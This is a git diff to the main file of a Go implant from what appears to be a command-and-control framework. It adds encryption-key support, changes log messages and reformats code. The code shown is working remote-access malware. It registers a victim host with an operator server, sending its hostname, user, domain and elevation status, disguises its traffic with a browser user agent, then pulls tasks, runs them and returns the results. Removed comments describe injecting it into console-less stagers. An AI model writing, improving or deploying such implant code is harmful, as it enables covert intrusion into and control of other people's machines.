@@ -11,40 +11,43 @@ import (
 
 	"github.com/carved4/carved/implant/pkg/tasks"
 	"github.com/carved4/carved/implant/pkg/transport"
+	"github.com/carved4/carved/shared/crypto"
 	"github.com/carved4/carved/shared/proto"
 	wc "github.com/carved4/go-wincall"
 )
 
-// update to match the vps or whatever ur hosting on :3
-// note: all prints in this wont be visible as stagers are built with no console, and this is injected into one of them.
-// ill make a better way to do config soon, i feel like its not too much of a hassle rn
 var (
-	ServerURL = "http://127.0.0.1:8443/"
-	Sleep     = uint32(5)
-	Jitter    = uint8(10)
+	ServerURL	= "http://127.0.0.1:8443/"
+	Sleep		= uint32(5)
+	Jitter		= uint8(10)
+	EncryptionKey	= ""
 )
 
 func main() {
+	if EncryptionKey != "" {
+		crypto.SetKey(EncryptionKey)
+	}
+
 	implantID := uuid.New().String()
 	meta := gatherMeta(implantID)
 	cfg := &transport.Config{
-		ServerURL: ServerURL,
-		Sleep:     Sleep,
-		Jitter:    Jitter,
-		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+		ServerURL:	ServerURL,
+		Sleep:		Sleep,
+		Jitter:		Jitter,
+		UserAgent:	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 	}
 	tasks.Config.Sleep = &cfg.Sleep
 	tasks.Config.Jitter = &cfg.Jitter
 	tasks.Config.ServerURL = ServerURL
 	t := transport.NewHTTPTransport(cfg, implantID)
-	fmt.Println("[-] attempting to register...")
+	fmt.Println("[+] attempting to register...")
 	for {
 		err := t.Register(meta)
 		if err == nil {
-			fmt.Println("[-] registered successfully!")
+			fmt.Println("[+] registered successfully")
 			break
 		}
-		fmt.Printf("[-] register failed: %v, retrying...\n", err)
+		fmt.Printf("[+] register failed: %v, retrying...\n", err)
 		time.Sleep(t.Sleep())
 	}
 
@@ -54,7 +57,7 @@ func main() {
 
 		newTasks, err := t.Beacon(pendingResults)
 		if err != nil {
-			fmt.Printf("[-] beacon error: %v\n", err)
+			fmt.Printf("[+] beacon error: %v\n", err)
 		} else {
 			if len(pendingResults) > 0 {
 				fmt.Printf("[+] sent %d results to server\n", len(pendingResults))
@@ -65,7 +68,7 @@ func main() {
 				fmt.Printf("[+] received %d tasks\n", len(newTasks))
 			}
 			for _, task := range newTasks {
-				fmt.Printf("[*] executing task: %s (%s)\n", task.Type, task.ID[:8])
+				fmt.Printf("[+] executing task: %s (%s)\n", task.Type, task.ID[:8])
 				result := tasks.Execute(task)
 				if result != nil {
 					fmt.Printf("[+] task completed: %s (status: %s)\n", task.ID[:8], result.Status)
@@ -87,19 +90,19 @@ func gatherMeta(implantID string) *proto.ImplantMeta {
 	process := getProcessName()
 
 	return &proto.ImplantMeta{
-		ID:        implantID,
-		Hostname:  hostname,
-		Username:  username,
-		Domain:    domain,
-		OS:        runtime.GOOS,
-		Arch:      runtime.GOARCH,
-		PID:       pid,
-		Process:   process,
-		Elevated:  elevated,
-		FirstSeen: time.Now(),
-		LastSeen:  time.Now(),
-		Sleep:     Sleep,
-		Jitter:    Jitter,
+		ID:		implantID,
+		Hostname:	hostname,
+		Username:	username,
+		Domain:		domain,
+		OS:		runtime.GOOS,
+		Arch:		runtime.GOARCH,
+		PID:		pid,
+		Process:	process,
+		Elevated:	elevated,
+		FirstSeen:	time.Now(),
+		LastSeen:	time.Now(),
+		Sleep:		Sleep,
+		Jitter:		Jitter,
 	}
 }
 
@@ -167,3 +170,4 @@ func getProcessName() string {
 	}
 	return path
 }
+
